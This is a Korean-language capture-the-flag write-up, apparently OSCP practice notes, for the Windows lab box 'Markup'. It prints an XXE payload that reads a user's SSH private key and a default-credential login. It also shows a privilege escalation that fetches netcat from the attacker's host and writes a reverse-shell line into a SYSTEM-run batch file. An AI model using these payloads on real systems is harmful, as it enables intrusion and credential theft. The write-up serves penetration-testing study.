---
slug: "markup"
title: "Markup"
date: 2026-06-20
category: "윈도우"
section: "OSCP"
tags: []
excerpt: "XML이 외부 엔티티를 검증 없이 처리해서 서버 파일을 읽을 수 있음"
readingTime: 4
---

# Box: Markup | Windows | Very Easy
날짜: 2026/06/20
소요시간: ~4시간

## Open Ports
- 22 (SSH - OpenSSH for Windows 8.1)
- 80 (HTTP - Apache 2.4.41)
- 443 (HTTPS - Apache 2.4.41)

## Interesting Services
**80 - HTTP (Apache/PHP/XAMPP)**
- 로그인 페이지 → default credential `admin:password` 성공
- /services.php 에서 Order 기능 발견
- 페이지 소스에서 `daniel` 유저명 확인
- Order 요청이 XML 1.0으로 처리됨 → XXE 가능

## Initial Foothold
**벡터: XXE → SSH Private Key 탈취**

XML이 외부 엔티티를 검증 없이 처리해서 서버 파일을 읽을 수 있음

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Users/daniel/.ssh/id_rsa">]>
<order>
<quantity>1</quantity>
<item>&xxe;</item>
<address>test</address>
</order>
```

```bash
# 응답에서 SSH 키 복사 후
nano id_rsa
chmod 400 id_rsa
ssh -i id_rsa daniel@<IP>
```
-> user.txt 획득
## Privilege Escalation
**벡터: Scheduled Task + Writable job.bat**

```bash
# 스케줄러가 SYSTEM 권한으로 job.bat 자동 실행
# job.bat이 BUILTIN\Users에게 (F) Full Control 권한 있음
icacls job.bat
# → BUILTIN\Users:(F) 확인  :  Users 그룹 모두에게 모든 권한 있다

# Kali에서
wget https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe
python3 -m http.server 8000
nc -lvnp 5555

# 타겟에서 (PowerShell)
wget 10.10.14.39:8000/nc64.exe -outfile nc64.exe

# cmd로 전환 (PowerShell에서 -e 파라미터 충돌)
cmd
echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.39 5555 > job.bat

# 스케줄러가 job.bat 실행하면 SYSTEM 권한 쉘 획득
type C:\Users\Administrator\Desktop\root.txt
```
-> root.txt 획득
## Rabbit Hole
- PowerShell에서 echo로 job.bat 덮어쓰려 했으나 `-e` 플래그 충돌
- Set-Content로 시도했으나 따옴표 지옥
- → cmd에서 echo 리다이렉션으로 해결

## 다음 박스에서 써먹을 것
- XXE payload: `file:///C:/경로` 형식 (Windows)
- `icacls` = Windows 권한 확인 (Linux의 `ls -al`)
- Writable 스케줄 태스크 → job.bat 덮어쓰기 privesc 패턴
- PowerShell wget으로 파일 전송
- PowerShell에서 `-e` 충돌 시 cmd로 전환

## 스크린샷 체크
- [ ] whoami
- [ ] ipconfig
- [ ] user.txt
- [ ] root.txt